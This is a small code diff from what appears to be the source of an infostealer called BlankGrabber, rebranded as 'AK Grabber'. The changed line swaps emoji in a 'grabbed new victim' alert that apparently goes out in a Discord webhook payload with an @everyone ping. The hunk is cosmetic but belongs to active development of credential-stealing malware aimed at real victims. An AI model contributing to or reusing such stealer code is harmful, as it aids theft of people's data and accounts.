@@ -1680,7 +1680,7 @@ class BlankGrabber:
                 image_url = "https://avatars.githubusercontent.com/u/194596336?v=4"
 
                 payload = {
-                    "content": "||@everyone|| grabbed new victim  👻🕳 " if Settings.PingMe else "",
+                    "content": "||@everyone|| 🃅 grabbed new victim 🃅 " if Settings.PingMe else "",
                     "embeds": [
                         {
                             "title": "AK Grabber",
